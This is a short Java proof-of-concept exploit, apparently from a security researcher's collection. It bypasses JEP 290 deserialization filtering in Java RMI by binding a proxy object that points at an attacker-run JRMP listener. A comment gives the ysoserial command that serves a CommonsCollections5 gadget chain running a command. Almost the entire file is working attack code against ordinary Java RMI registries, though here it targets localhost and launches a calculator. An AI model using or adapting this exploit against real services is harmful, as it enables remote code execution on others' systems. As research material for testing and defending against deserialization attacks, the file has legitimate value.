package nth347.exploits;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

// Bypass JEP 290
// java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections5 "gnome-calculator"
public class DGCClientBypass {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
        // Target RMI service
        Registry reg = LocateRegistry.getRegistry("127.0.0.1", 1099);

        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint("127.0.0.1", 1098); // Attacker's malicious RMI service
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Registry proxy = (Registry) Proxy.newProxyInstance(
                DGCClientBypass.class.getClassLoader(),
                new Class[] { Registry.class },
                remoteObjectInvocationHandler
        );
        reg.bind("nth347", proxy);
    }
}
